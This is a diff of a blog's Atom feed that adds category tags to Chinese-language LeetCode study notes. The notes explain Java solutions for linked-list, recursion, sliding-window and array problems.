@@ -11,6 +11,16 @@
     <content type="html"><![CDATA[<h2 id="203-移除链表元素"><a href="#203-移除链表元素" class="headerlink" title="203.移除链表元素"></a>203.移除链表元素</h2><p><img src="https://img-blog.csdnimg.cn/20210506084920502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""></p><h2 id="解法1-虚拟节点法"><a href="#解法1-虚拟节点法" class="headerlink" title="解法1:虚拟节点法"></a>解法1:虚拟节点法</h2><pre><code class="java">   ListNode virtualnode=new ListNode(val-1);        virtualnode.next=head;//设置虚拟节点，为本题关键，为了处理如果头节点需要删除的情况        ListNode tmp=virtualnode;        while(tmp.next!=null) {            if(tmp.next.val==val) {//一旦下一个节点val相等                tmp.next=tmp.next.next;//移除下一个节点            }            else {                tmp=tmp.next;            }        }        return virtualnode.next;//注意，是返回.next，因为第一个节点是虚拟节点。而返回virtualnode而不是tmp的原因是，两者所拥有的各节点完全相同</code></pre><h2 id="思路简述"><a href="#思路简述" class="headerlink" title="思路简述"></a>思路简述</h2><p>本题的关键就是<strong>虚拟节点</strong>的应用，虚拟节点的设置，就是为了处理头节点需要被删除时的情况。然后一次遍历，看此时节点的下一个节点是否需要删除。⚠️，是判断下一个节点！<br>而返回virtualnode而不是tmp的原因是，两者所拥有的各节点完全相同，而不是tmp复制virtualnode节点的关系，两者本质上是一个链表。区别在于此时指向哪一个节点，比如在最后return的时候，virtualnode指向开头的虚拟节点，而tmp经过遍历已经指向了最后一个节点。所以应该是返回virtualnode的下一个节点，真正的头节点。<br><strong>本题感悟</strong>，要对链表的存储有着深刻的认识，链表上各个节点都是各自流浪在内存的不同位置。地理位置上本并没有什么关系，是指针强行将它们联系起来，但是本质上各节点是独立的个体。</p><h2 id="解法2-递归法"><a href="#解法2-递归法" class="headerlink" title="解法2:递归法"></a>解法2:递归法</h2><pre><code class="java">public ListNode removelistelement(ListNode head,int val) {            if(head==null) {             return null;             }         head.next=removelistelement(head.next,val);         if(head.val==val)             return head.next;         else             return head;     }</code></pre><h2 id="思路简述-1"><a href="#思路简述-1" class="headerlink" title="思路简述"></a>思路简述</h2><p>主要思路就是先“递”到最后的null节点，然后head.next=null，首先到达了尾节点，然后判断此时的尾节点的值是否等于val，从而判断是否删除当前的节点，如果删除，就返回当前节点的下一个节点。否则，就返回当前节点。重复上面的步骤，依次“归”，直到回到第一个节点。很巧妙的递归方法。</p><h2 id="19-删除链表的倒数第N个结点"><a href="#19-删除链表的倒数第N个结点" class="headerlink" title="19.删除链表的倒数第N个结点"></a>19.删除链表的倒数第N个结点</h2><p><img src="https://img-blog.csdnimg.cn/20210506084903173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""></p><pre><code class="java">public ListNode removeNthfromEnd(ListNode head,int n) {      ListNode virtualnode=new ListNode(0);//设置虚拟节点，解决头节点被删除问题        virtualnode.next=head;        ListNode fast=virtualnode;        ListNode slow=virtualnode;        while(n!=0) {            fast=fast.next;                            n--;        }//上面这个循环是让快指针先走n步        while(fast.next!=null) {//直到快指针走到尾节点，那么慢指针走的步数等于总节点数m-1-n，到达第m-n个节点。倒数第n个数字，就是正数第m-n+1个节点；所以要删除此时slow后面的节点            fast=fast.next;            slow=slow.next;//快慢指针同时前进        }        slow.next=slow.next.next;//删除慢节点后面的节点，也就是倒数第n个节点        return virtualnode.next;}</code></pre><h2 id="思路简述-2"><a href="#思路简述-2" class="headerlink" title="思路简述"></a>思路简述</h2><p>关键点在于快慢指针的设置，先让快指针先走n步。直到快指针走到尾节点，那么慢指针走的步数等于总节点数m-1-n，也就是到达第m-n个节点。而倒数第n个数字，就是正数第m-n+1个节点；所以要删除此时slow后面的节点。最后返回virtualnode.next.</p>]]></content>
     
     
+    <categories>
+      
+      <category>链表</category>
+      
+      <category>虚拟节点</category>
+      
+      <category>双指针</category>
+      
+    </categories>
+    
     
     <tags>
       
@@ -29,6 +39,16 @@
     
     <content type="html"><![CDATA[<p><img src="https://img-blog.csdnimg.cn/20210506003545595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""></p><h2 id="第一种思路：利用栈"><a href="#第一种思路：利用栈" class="headerlink" title="第一种思路：利用栈"></a>第一种思路：利用栈</h2><pre><code class="java">public boolean ispalindrome(ListNode head) {         Stack&lt;ListNode&gt; stack=new Stack&lt;&gt;();         ListNode tmp=head;         while(head!=null) {.     //⚠️，不能写成head.next!=null             stack.push(head);             head=head.next;         }         while(tmp!=null) {. //同理，不能写成tmp.next!=null             if(tmp.val!=stack.pop().val) {                 return false;             }             tmp=tmp.next;             }         return true;     }</code></pre><h2 id="思路简述"><a href="#思路简述" class="headerlink" title="思路简述"></a>思路简述</h2><p>本题的基本思路就是利用回文串的特性，从链表头部开始遍历和尾部开始遍历所经历的元素应该是完全一致的。所以就利用栈先进后出的性质，先创建一个栈来存储链表内容，然后把pop出的元素数值和从链表头部开始遍历的元素数值一一进行比较，如果完全一致就返回true。</p><h2 id="第二种思路：反转后半部分链表"><a href="#第二种思路：反转后半部分链表" class="headerlink" title="第二种思路：反转后半部分链表"></a>第二种思路：反转后半部分链表</h2><pre><code class="java"> public ListNode reverse(ListNode head) {        if(head==null||head.next==null) {            return head;        }        ListNode cur=reverse(head.next);        head.next.next=head;        head.next=null;        return cur;    }    public boolean isPalindrome(ListNode head) {        ListNode fast=head;        ListNode slow=head;        while(fast!=null&amp;&amp;fast.next!=null) {//注意要把fast!=null放在fast.next!=null前面，防止空指针错误。            fast=fast.next.next;            slow=slow.next;        }//这个循环是为了让slow指向链表中央的节点。        //slow=slow.next;        fast=head;        slow=reverse(slow);//反转后半段链表        while(slow!=null) {//进行比较            if(fast.val!=slow.val) {                return false;            }            slow=slow.next;            fast=fast.next;        }        return true;    }</code></pre><h2 id="思路简述-1"><a href="#思路简述-1" class="headerlink" title="思路简述"></a>思路简述</h2><p>这个题的主要思路就是利用快慢指针，将快指针的步速设置为慢指针的两倍，这样当快指针遍历完时，慢指针正好指向链表中间节点。然后对慢指针指向的后半段链表执行反转操作。将快指针调到链表头节点。然后快慢指针逐一进行对比，判断其值是否相同。</p>]]></content>
     
+    
+    <categories>
+      
+      <category>链表</category>
+      
+      <category>栈</category>
+      
+      <category>双指针</category>
+      
+    </categories>
     
     
     <tags>
@@ -49,6 +69,14 @@
     <content type="html"><![CDATA[<p>下面两道题本质上都是链表求交点问题，有环的链表就用快慢指针（龟兔赛跑思想）来解决，无环的链表则思考如何达成长度相同的路径的目标。</p><h2 id="141-环形链表"><a href="#141-环形链表" class="headerlink" title="141.环形链表"></a>141.环形链表</h2><p><img src="https://img-blog.csdnimg.cn/20210506002721607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""></p><pre><code class="java">public boolean hascycle(ListNode head) {    if(head==null||head.next==null) {        return false;    }    ListNode fast=head.next;    ListNode slow=head;    while(slow!=fast) {        if(fast==null||fast.next==null)            return false;        slow=slow.next;        fast=fast.next.next;//快指针的速度是慢指针的两倍    }    return true;}</code></pre><h2 id="思路简述"><a href="#思路简述" class="headerlink" title="思路简述"></a>思路简述</h2><p>定义两个指针，一快一满。慢指针每次只移动一步，而快指针每次移动两步。初始时，慢指针在位置 head，而快指针在位置 head.next。这样一来，如果在移动的过程中，快指针反过来追上慢指针，就说明该链表为环形链表。否则快指针将到达链表尾部，该链表不为环形链表。<br>不能一开始就把快慢指针都指向head，这样会直接通过循环判断while(slow!=fast)，并return true；</p><h2 id="160-相交链表"><a href="#160-相交链表" class="headerlink" title="160.相交链表"></a>160.相交链表</h2><p><img src="https://img-blog.csdnimg.cn/20210506002850789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""></p><pre><code class="java">  public ListNode getIntersectionNode(ListNode headA, ListNode headB) {       ListNode A=headA;        ListNode B=headB;        while(A!=B) {            A=A!=null?A.next:headB;//注意，应该是判断A！=null，而不是A.next!=null;            B=B!=null?B.next:headA;//同理        }        return A;    }</code></pre><h2 id="思路简述-1"><a href="#思路简述-1" class="headerlink" title="思路简述"></a>思路简述</h2><p>这个解题思路关键就是找AB相同长度的那条路线。<br>如果有交点，那么AB交点后的长度一定是相同的，不同的只是在相交之前的长度，那么如果让A再走B相交之前的那段路，B走A相交之前的那段路。<br>也就是A走过的长度为A整+B前=A前+A后+B前，B走过的长度为B整+A前=B前+B后+A前。而A后和B后长度是相等的。<br>注意上面判断为什么是A！=null而不是A.next!=null ，如果是后者，那么如果AB之间并没有交点，就会陷入死循环，A永远都不会等于B。而前者，就算AB之间是平行的，没有交点，在AB都走完A整+B整后（路径长度相同），AB也一定都会指向null而跳出循环。</p>]]></content>
     
     
+    <categories>
+      
+      <category>链表</category>
+      
+      <category>双指针</category>
+      
+    </categories>
+    
     
     <tags>
       
@@ -68,6 +96,18 @@
     <content type="html"><![CDATA[<h2 id="递归的三大步骤"><a href="#递归的三大步骤" class="headerlink" title="递归的三大步骤"></a>递归的三大步骤</h2><p>1.明确函数要做什么，也就是定义递归的功能。<br>2.明确递归的结束（退出递归）的条件。<br>3.找到函数的等价关系式，要不断缩小参数的范围</p><p><strong>模型一：在递去的过程中解决问题</strong></p><pre><code class="java">function recursion(大规模){      if (end_condition){ // 明确的递归终止条件             end; // 简单情景         }else{ // 在将问题转换为子问题的每一步，解决该步中剩余部分的问题                                                       solve;  //递去     recursion(小规模); // 递到最深处后，不断地归来 } }</code></pre><p><strong>模型二：在归来的过程中解决问题</strong></p><pre><code class="java">function recursion(大规模){      if (end_condition){ // 明确的递归终止条件             end; // 简单情景         }else{ //先将问题全部描述展开，再由尽头返回依次解决每步中剩余部分的问题                                                     recursion(小规模); // 递去     solve；    //归来 } }</code></pre><p><img src="https://img-blog.csdnimg.cn/20210506002327511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""></p><p><img src="https://img-blog.csdnimg.cn/20210506002345945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""><br><strong>关键在于，理解透“递”和“归”的过程。</strong></p>]]></content>
     
     
+    <categories>
+      
+      <category>递归</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>leetcode</tag>
+      
+    </tags>
     
   </entry>
   
@@ -80,6 +120,14 @@
     
     <content type="html"><![CDATA[<h2 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206.反转链表"></a>206.反转链表</h2><p><img src="https://img-blog.csdnimg.cn/20210504230834309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""><br><strong>主要有两种解法，双指针迭代和递归方法</strong></p><h2 id="1-双指针迭代法"><a href="#1-双指针迭代法" class="headerlink" title="1.双指针迭代法"></a>1.双指针迭代法</h2><pre><code class="java">public ListNode reverseList(ListNode head) {             ListNode pre=null;             ListNode cur=head;//cur一开始赋值为头节点             ListNode tmp=null;//该变量负责保存cur的下一个节点，起暂存储功能             while(cur!=null) {                 tmp=cur.next;                 cur.next=pre;//cur调转指针方向，转向pre，也就是反转链表方向                 pre=cur;                 cur=tmp;//上面这两行代码其实相当于把pre和cur同时前进一步             }             //整个循环相当于重复将cur所指方向进行反转，同时cur不断向前行进             return pre;             /*注意，cur在上面循环里会一直走到链表的最终节点             *所以最后cur跳出循环时是等于null，而pre此时为链表的最终节点*/         }</code></pre><h2 id="思路简述"><a href="#思路简述" class="headerlink" title="思路简述"></a>思路简述</h2><p>设置两个指针，第一个指针叫 pre，最初是指向 null 的。<br>第二个指针 cur 指向 head，然后不断遍历 cur。<br>同时设置一个指针tmp用来保存cur的下一个节点。<br>每次迭代到 cur，都将 cur 的 next 指向 pre，然后 pre 和 cur 前进一位。<br>都迭代完了(cur 变成 null 了)，pre 就是最后一个节点了。</p><h2 id="2-递归方法"><a href="#2-递归方法" class="headerlink" title="2.递归方法"></a>2.递归方法</h2><p>理解递归法的关键就是要理解栈是怎样野蛮生长的，函数调用，函数返回在栈里是怎样进行的</p><pre><code class="java">public ListNode reverseList1(ListNode head) {    if(head==null||head.next==null) {        return head;    }    ListNode cur=reverseList1(head.next);    head.next.next=head;    head.next=null;    return cur;}</code></pre><h2 id="思路简述-1"><a href="#思路简述-1" class="headerlink" title="思路简述"></a>思路简述</h2><p>关键几点，当一个被调用函数a5遇到retrun head，要销毁栈帧的时候，最后会执行pop eip操作，也就是将代码段的eip指针指向调用a5函数的b4函数的下一条指令。<br>LIstNode cur=reverseList(head.next)其实是两条指令，第一条是调用函数reverseList，第二条是将reverseList返回值赋值给cur。<br>也就是说，当a5被调用完毕时，下一步操作就是对cur进行赋值。然后依次执行b4里ListNode cur=reverseList1(head.next);的下面几条指令，⚠️，此时b4里的head是4！直到遇到return cur，此时，b4为被调用函数，c3为调用函数，此时c3里的head是3。<br>重复上面的操作，简称套娃。<br>可以看出，cur始终保持不变，指向最后一个节点。</p><h2 id="函数调用主要步骤"><a href="#函数调用主要步骤" class="headerlink" title="函数调用主要步骤"></a>函数调用主要步骤</h2><p>在函数a调用一个函数b的时候，重要的几个步骤：<br>一、开始时<br>1.函数b参数从左至右入栈<br>2.push eip  （将下一条指令入栈保存起来，同时esp指针下移<br>3.push ebp   （将函数a的基指针入栈保存）<br>4.mov ebp esp  （将esp的值存入ebp，也就是将ebp指向esp，同时下移esp指针）<br>5.push ebx 、push esi 、push edi；然后进行中间的<br>二、返回时<br>1.pop edi、 pop esi、pop ebx；<br>2.mov esp ebp； （将ebp的值给esp，也就是将esp指向ebp，销毁b函数的函数栈帧<br>3.pop ebp；<br>4.ret （这一条指令相当于pop eip ；也就是说eip将指向原来保存的下一条指令<br>5.add esp 8；（此时如果传入b函数的参数已经不需要了，那么此时将esp指针上移，抬升栈帧，保持堆栈平衡。）</p><h2 id="21-合并两个链表"><a href="#21-合并两个链表" class="headerlink" title="21.合并两个链表"></a>21.合并两个链表</h2><p><img src="https://img-blog.csdnimg.cn/2021050423133411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""></p><pre><code class="java">public ListNode mergetwoLists(ListNode l1,ListNode l2) {    if(l1==null) {        return l2;    }    else if(l2==null) {        return l1;    }    else if(l1.val&lt;l2.val) {        l1.next=mergetwoLists(l1.next,l2);        return l1;    }    else  {        l2.next=mergetwoLists(l2.next,l1);        return l2;    }    }</code></pre><h2 id="思路简述-2"><a href="#思路简述-2" class="headerlink" title="思路简述"></a>思路简述</h2><p>终止条件：当两个链表都为空时，表示我们对链表已合并完成。<br>如何递归：我们判断 l1 和 l2 头结点哪个更小，然后较小结点的 next 指针指向其余结点的合并结果。（调用递归）</p>]]></content>
     
+    
+    <categories>
+      
+      <category>链表</category>
+      
+      <category>递归</category>
+      
+    </categories>
     
     
     <tags>
@@ -100,6 +148,14 @@
     <content type="html"><![CDATA[<h2 id="滑动窗口模版"><a href="#滑动窗口模版" class="headerlink" title="滑动窗口模版"></a>滑动窗口模版</h2><p><img src="https://img-blog.csdnimg.cn/2021050400001523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""></p><pre><code class="java">初始化慢指针 = 0初始化 ansfor 快指针 in 可迭代集合   更新窗口内信息(通常是快指针逐增，也就是对右边界进行操作)   while 窗口内不符合题意      扩展或者收缩窗口（通常是对左边界进行操作）      慢指针移动   更新答案返回 ans</code></pre><p><strong><strong>看到题目想到要用滑动窗口法，关键词就在于“连续”，最后所求的大概率是一段连续子序列，同时不改变数组原来的位置。滑动窗口的精妙之处在于根据当前子序列和大小的情况，不断调节子序列的起始位置。从而将O(n^2)的暴力解法降为O(n)。</strong></strong></p><h2 id="209-长度最小的子数组"><a href="#209-长度最小的子数组" class="headerlink" title="209.长度最小的子数组"></a>209.长度最小的子数组</h2><p><img src="https://img-blog.csdnimg.cn/20210504000212521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""></p><h2 id="思路简述"><a href="#思路简述" class="headerlink" title="思路简述"></a>思路简述</h2><p>题目中要求找出长度最小的连续子数组，那么就要想到用滑动窗口来解题的可能性。<br>这个题直接套模版就可以，快指针不断向右边界靠近，并实时判断此时快慢指针包括区间内的总和sum是否大于给定值val。<br>一旦大于，也就是快慢指针区间之间可以减少元素，那么就需要慢指针上场了。<br>首先记录此时的最小长度minlen是否为快慢指针之间的长度right-left+1。然后left右移，区间缩小，sum减小后再进行判断，如此循环。</p><pre><code class="java">public static int theminsubarraylen(int[] nums,int val) {     int minlen=Integer.MAX_VALUE;     int left=0;     int sum=0;     for(int right=0;right&lt;nums.length;right++) {//右边界扩展         sum+=nums[right];         while(sum&gt;=val) {//当不满足条件时，也就是需要满足保证sum&gt;=val并且快慢指针区间长度最小             minlen=Math.min(minlen, right-left+1);             sum-=nums[left++];//快慢指针区间缩小         }     }     return minlen==Integer.MAX_VALUE?0:minlen;//务必要加这一句，不然当便利完整个数组依然不满足条件的时候，minlen不会被赋值，会是一开始赋的Integer.MAXVALUE的值}</code></pre><h2 id="904-水果成篮"><a href="#904-水果成篮" class="headerlink" title="904.水果成篮"></a>904.水果成篮</h2><p><img src="https://img-blog.csdnimg.cn/20210504000347459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""></p><h2 id="思路简述-1"><a href="#思路简述-1" class="headerlink" title="思路简述"></a>思路简述</h2><p>这个题目的关键是读懂题意，本质上就是让求一段最长的连续子序列，这一段序列里只能出现两种数字。看到连续，想到滑动窗口解法。</p><p>主要思路还是可以套模版，但是因为要考虑到两种元素，要加上对map的运用。</p><pre><code class="java">public static int totalfruit(int[] nums) {         if(nums==null||nums.length==0)             return 0;         int len=nums.length;         Map&lt;Integer,Integer&gt; map=new HashMap&lt;&gt;();         int maxSum=0,left=0;         for(int right=0;right&lt;len;right++) {             map.put(nums[right], map.getOrDefault(nums[right], 0)+1);             while(map.size()&gt;2) {//当不符合条件时，也就是超过两种元素，调整左边界即慢指针                 map.put(nums[left], map.get(nums[left])-1);                 if(map.get(nums[left])&lt;1) {                     map.remove(nums[left]);                 }                 left++;             }             maxSum=Math.max(maxSum, right-left+1);         }         return maxSum;     }</code></pre><p><a href="https://github.com/azl397985856/leetcode/blob/master/thinkings/slide-window.md" target="_blank" rel="noopener">https://github.com/azl397985856/leetcode/blob/master/thinkings/slide-window.md</a><br><strong>介绍相关的博文，很详细</strong></p>]]></content>
     
     
+    <categories>
+      
+      <category>数组</category>
+      
+      <category>滑动窗口</category>
+      
+    </categories>
+    
     
     <tags>
       
@@ -118,6 +174,14 @@
     
     <content type="html"><![CDATA[<h2 id="27-移除元素"><a href="#27-移除元素" class="headerlink" title="27.移除元素"></a>27.移除元素</h2><p><img src="https://img-blog.csdnimg.cn/20210503235241580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""></p><h2 id="思路简述"><a href="#思路简述" class="headerlink" title="思路简述"></a>思路简述</h2><p>这个题有两种方法，第一种是暴力，另一种是双指针法。而且需要注意的是不能使用额外的数组空间。<br>但这两种方法的本质相同，都是将不等于val的数移到数组左部，或者说，将等于val和不等于val的两部分进行分离。<br>暴力法的核心算法是每当遇到一个等于val的数nums[i]时，就将下标i之后的所有数都向前移一位，移完后将数组nums的size减1。最后返回size；</p><pre><code class="java">public static int removeelement(int[] nums,int val) {          int size=nums.length;          for(int i=0;i&lt;size;i++) {              if(nums[i]==val) {                for(int j=i+1;j&lt;size;j++) {                    nums[j-1]=nums[j];                }                size--;                i--;              }          }          return size；     }</code></pre><p>双指针法的核心算法在于设立left、right快慢指针，right指针任务是进行遍历，而left指针任务是保存值不是val的数，当right指针遇到不是val的数时，left指针将该数进行存储后右移。<br>left从左边界0开始，如果nums[right]不等于val，那么nums[left]=nums[right]，同时left指针+1。最后返回的left指针，指向左部存储非val值的最后一位。</p><pre><code class="java">public int removeElement(int[] nums, int val) {        int left=0;        for(int right=0;right&lt;nums.length;right++) {            if(nums[right]!=val) {                nums[left]=nums[right];                left++;            }           }        return left;    }</code></pre><h2 id="26-删除排序数组中的重复项"><a href="#26-删除排序数组中的重复项" class="headerlink" title="26.删除排序数组中的重复项"></a>26.删除排序数组中的重复项</h2><p><img src="https://img-blog.csdnimg.cn/20210503235344276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""></p><h2 id="思路简述-1"><a href="#思路简述-1" class="headerlink" title="思路简述"></a>思路简述</h2><p>首先要注意题目给出的是一个有序数组！换言之，重复的元素都是挨着的。<br>关键思路就是设置left和right指针（快慢指针），right指针负责遍历，left指针则负责判断right指针指向的元素是否和自己指向的元素相同，如果相同，则不动如山。如果不同，则left右移一位，并存储right指向的元素。即nums[left++]=nums[right];<br>注意，最后要返回left+1；因为是要返回数组的新长度。</p><pre><code class="java">public static int removeduplicates(int[] nums) {         int left=0;         for(int right=0;right&lt;nums.length;right++) {             if(nums[right]!=nums[left]) {                 nums[++left]=nums[right];             }         }         return left+1;     }</code></pre><p><strong>双指针套路合集</strong><br><a href="https://zhuanlan.zhihu.com/p/95747836" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/95747836</a><br>可看上面这个总结</p>]]></content>
     
+    
+    <categories>
+      
+      <category>数组</category>
+      
+      <category>双指针</category>
+      
+    </categories>
     
     
     <tags>
@@ -138,6 +202,12 @@
     <content type="html"><![CDATA[<h2 id="1-数组-简单-找到所有数组中消失的数字"><a href="#1-数组-简单-找到所有数组中消失的数字" class="headerlink" title="1.数组-简单-找到所有数组中消失的数字"></a>1.数组-简单-找到所有数组中消失的数字</h2><p><img src="https://img-blog.csdnimg.cn/20210427163741301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""><br>这道题的收获就是又重温了一下基本概念，空间复杂度和java里面list的使用。</p><h2 id="本题思路简述"><a href="#本题思路简述" class="headerlink" title="本题思路简述"></a>本题思路简述</h2><p>这个题的难点主要就是在于实现自己编写代码空间复杂度O(1)，时间复杂度（n）。通过空间复杂度的要求，可以看出，最好我们自己不要再开辟一个新的数组了，就用题目中已经给的nums数组会比较好一些。</p><p>主要思路就是对nums进行遍历，将里面每一个数字对应的i进行加n操作，然后再重新进一遍遍历，看看数组里哪一个i对应的nums[i]是小于n的，如果小于，那么就是我们需要的答案。</p><p>需要注意的就是，为了避免遍历的时候，当时的数字已经执行了+n操作，所以需要对每一个数字进行%n操作，还原回原来的数字。</p><h2 id="2-数组-简单-买卖股票的最佳时机"><a href="#2-数组-简单-买卖股票的最佳时机" class="headerlink" title="2.数组-简单-买卖股票的最佳时机"></a>2.数组-简单-买卖股票的最佳时机</h2><p><img src="https://img-blog.csdnimg.cn/20210427164040986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""></p><h2 id="2-1思路提点"><a href="#2-1思路提点" class="headerlink" title="2.1思路提点"></a>2.1思路提点</h2><p>这个题用两种方法求解的，一种利用了动归思想，一种利用了暴力求解思想。<br>本质上就是求数组里前后两个数之差的最大值。（注意，一定是一前一后）</p><h2 id="2-2思路简述"><a href="#2-2思路简述" class="headerlink" title="2.2思路简述"></a>2.2思路简述</h2><p>1.动态规划思路<br>用这个思路的话，主要的点就是要设立两个值min，max来进行记录<br>其中，min值记录的是到当前数组i的位置之前区域的最小值<br>Max值记录的是利润最大值。<br>每次遍历的时候，执行两个判断：<br>1.min=Math.min(min.nums[I]);<br>2.max=Math.max(max,nums[I]-min);</p><p>最后返回max就可以啦</p><p>2.暴力求解思路<br>简单粗暴，就是计算出数组里每两个前后数字之差。但是会超时<br>核心代码.  max=Math.max(max,   mums[j]-nums[I]);</p><h2 id="3-数组-简单-多数元素（求众数）"><a href="#3-数组-简单-多数元素（求众数）" class="headerlink" title="3.数组-简单-多数元素（求众数）"></a>3.数组-简单-多数元素（求众数）</h2><p><img src="https://img-blog.csdnimg.cn/20210427164452521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""></p><h2 id="3-1-思路提点"><a href="#3-1-思路提点" class="headerlink" title="3.1 思路提点"></a>3.1 思路提点</h2><p>首先说一下，这道题里面学到了怎么在java里面调用排序；<br>就是用Arrays.sort( )这个方法；<br>另外就是学到了摩尔投票法这个方法。</p><h2 id="3-2-思路简述"><a href="#3-2-思路简述" class="headerlink" title="3.2 思路简述"></a>3.2 思路简述</h2><p>1一种比较简单的方法-排序法</p><p>主要思想就是将数组先进行排序，因为这个题目说了，一定存在出现次数超过半数以上的数字，所以排序之后的数组，中间的那个数，一定就是众数。<br>用Arrays.sort（）这个方法。</p><p>2.进阶方法-摩尔投票法</p><p>其主要思想就是用投票的方法来进行判断，如果有相同的，就计数+1，视为投赞成票，如果不相同，则计数-1。如果计数减为0，那么就换一个数，再进行以上的计数模式。</p><p>因为多数元素的个数-其余元素的总个数》=1<br>所以抵消到最后肯定还剩余至少一个多数元素。<br><img src="https://img-blog.csdnimg.cn/20210427164709678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""></p><h2 id="3-3-求众数2（进阶版）"><a href="#3-3-求众数2（进阶版）" class="headerlink" title="3.3 求众数2（进阶版）"></a>3.3 求众数2（进阶版）</h2><p><img src="https://img-blog.csdnimg.cn/20210427164841563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""><br>这道题和上一道最大的区别就是从选一个众数变成了选两个最多数。<br>怎么说呢，要找到其中所有出现超过n/3的数，那么最多只存在两个数满足，因为三个数都超过n/3的话，那么就超过1了，明显不可能。<br>所以此时就将候选者设置为2个，用上一题的方法来用其他的数和这两个数进行对比，如果相同则加1，如果不同则减1。如果此时count为0，则替换候选者后再将count置一。</p><p>而且需要注意的是，在选出两个候选者之后，必须重新对他们进行计数验证，看看是不是真的大于1/3，如果确定是，那么就加入list。<br>此题结束。</p><p>下面是一个小小的总结。<br><img src="https://img-blog.csdnimg.cn/20210427164923430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpYW9xaW5nc2hhbg==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt=""></p><h2 id="4-数组-简单-最大子序和"><a href="#4-数组-简单-最大子序和" class="headerlink" title="4.数组-简单-最大子序和"></a>4.数组-简单-最大子序和</h2><p><img 